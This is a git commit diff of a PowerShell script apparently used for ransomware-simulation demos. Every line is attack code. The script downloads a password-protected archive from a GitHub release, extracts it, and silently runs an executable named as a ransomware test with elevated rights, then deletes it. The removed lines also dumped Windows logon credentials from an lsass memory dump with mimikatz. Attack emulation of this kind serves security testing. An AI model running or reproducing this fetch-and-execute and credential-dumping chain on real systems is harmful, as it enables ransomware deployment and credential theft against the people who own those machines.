97daca48f9506c0fcf509e9e7b77af5b4f9d9634
tameval <114147355+tameval@users.noreply.github.com>
2022-10-20 20:38:29 +0900

    Update ransom_124509.ps1

--- ransom_124509.ps1
+++ ransom_124509.ps1
@@ -1,5 +1,6 @@
-$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\demo_ransomware.zip
-cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\demo_ransomware.zip'
-Remove-Item $env:TEMP\demo_ransomware.zip
-cd $env:TEMP
-.\mimikatz.exe "sekurlsa::minidump %TEMP%\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File ($Env:TEMP + "\mimihash.txt")
+$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\ransom_test.zip
+cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\ransom_test.zip'
+Remove-Item $env:TEMP\ransom_test.zip
+Start-Process -FilePath $env:TEMP\ransom_test_v120.exe -Args "/S" -Verb RunAs #バージョンを確認
+Start-Sleep -s 60
+Remove-Item $env:TEMP\ransom_test_v120.exe #バージョンを確認
